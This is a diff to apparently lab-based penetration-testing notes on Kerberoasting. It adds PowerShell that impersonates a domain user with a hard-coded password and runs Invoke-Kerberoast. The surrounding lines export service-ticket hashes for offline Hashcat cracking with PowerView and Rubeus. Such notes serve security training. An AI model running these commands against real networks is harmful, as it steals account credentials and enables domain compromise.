@@ -127,6 +127,17 @@ Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat | Export-C
 Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
 ```
 
+### Way number 2
+
+```powershell
+$Password = ConvertTo-SecureString 'Ashare1972' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('HTB.LOCAL\amanda', $Password)
+
+Invoke-UserImpersonation -Credential $Cred
+Invoke-Kerberoast
+```
+
+
 ## Using Rubeus
 
 Let's use Rubeus to request tickets for accounts with the admincount attribute set to 1. These would likely be high-value targets and worth our initial focus for offline cracking efforts with Hashcat. Be sure to specify the /nowrap flag so that the hash can be more easily copied down for offline cracking using Hashcat
